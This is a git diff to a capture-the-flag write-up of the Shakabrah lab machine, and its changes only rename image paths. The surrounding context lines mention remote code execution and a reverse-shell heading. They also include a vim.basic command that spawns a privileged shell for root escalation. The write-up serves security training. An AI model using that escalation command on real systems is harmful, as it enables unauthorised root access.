@@ -34,11 +34,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web PORT: 80
 
-![img](/assets/images/CTF/Pg-Play/Shakabrah/web.png)
+![img](/assets/images/CTF/Proving_Grounds/Shakabrah/web.png)
 
 The target is vulnerable to RCE.
 
-![img](/assets/images/CTF/Pg-Play/Shakabrah/rce.png)
+![img](/assets/images/CTF/Proving_Grounds/Shakabrah/rce.png)
 
 ## Obtain Reverse shell
 
@@ -104,11 +104,11 @@ www-data@shakabrah:/var/www/html$ /usr/bin/vim.basic
 :py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")
 ```
 
-![img](/assets/images/CTF/Pg-Play/Shakabrah/gtfo.png)
+![img](/assets/images/CTF/Proving_Grounds/Shakabrah/gtfo.png)
 
 **Root Obtained**
 
-![img](/assets/images/CTF/Pg-Play/Shakabrah/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Shakabrah/root.png)
 
 Thanks for reading!
 
